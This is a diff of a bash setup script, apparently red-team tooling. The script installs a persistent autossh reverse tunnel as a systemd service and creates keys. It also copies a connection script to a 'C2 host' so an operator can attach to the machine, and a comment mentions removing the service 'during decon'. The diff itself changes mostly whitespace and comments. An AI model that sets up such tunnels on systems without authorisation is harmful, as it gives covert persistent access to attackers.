@@ -49,9 +49,9 @@ do
 		a)
 			AWS=1
 			;;
-        s)
-            AUTOSSH=1
-            ;;
+        	s)
+            		AUTOSSH=1
+            		;;
 		k)
 			KEY="$OPTARG"
 			;;
@@ -223,6 +223,7 @@ chmod 700 /etc/tunnel
 
 
 # Generate ssh key in localhost
+
 ### Test this block
 echo "${bold}### Creating new SSH key: /var/run/autossh/.ssh/id_rsa! ###"
 ssh-keygen -t rsa -b 4096 -f /var/run/autossh/.ssh/id_rsa
@@ -240,11 +241,10 @@ chgrp -R autossh /etc/tunnel/.ssh
 echo "${bold}### Creating autossh configuration files ###"
 cat > /etc/default/autossh <<____HERE
 ##############################################
-#Specifies how long ssh must be up before we
-#consider it a successful connection
+#Specifies how long ssh must be up before we consider it a successful connection
 AUTOSSH_GATETIME=0
-#Sets the connection monitoring port.
-#A value of 0 turns the monitoring function off.
+
+#Sets the connection monitoring port. A value of 0 turns the monitoring function off.
 AUTOSSH_PORT=0
 AUTOSSH_LOGLEVEL=7
 AUTOSSH_LOGFILE=/var/run/autossh/user_ssh_error.out
@@ -254,7 +254,7 @@ ____HERE
 
 cat > /lib/systemd/system/autossh.service <<HEREDOC
 
-# This is the systemd file that will be added
+# This is the systemd file that will be added - remove this during decon
 #############################################
 [Unit]
 Description=autossh
@@ -311,7 +311,7 @@ else
 # Creating hmu.sh, which should be run on the C2 host. This file transfers the C2 key back to the host and attaches to the SSH session.
     echo "${bold}### Creating & transferring remote connection script ###"
     echo "ssh-copy-id ${USERLOCAL}@localhost -p 43022 && ssh ${USERLOCAL}@localhost -p 43022" > /home/$USERLOCAL/hmu_$USERLOCAL.sh
-    sudo chmod 777 /home/$USERLOCAL/hmu_$USERLOCAL.sh 
+    sudo chmod 777 /home/$USERLOCAL/hmu_$USERLOCAL.sh
     scp /home/$USERLOCAL/hmu_$USERLOCAL.sh $HOST:/root
     printf "\n"
 
@@ -324,6 +324,7 @@ else
     printf "\n"
     exit
 fi
+
 
 # Finishing script
     echo "${bold}### Donezo! Please reboot the machine. ###"
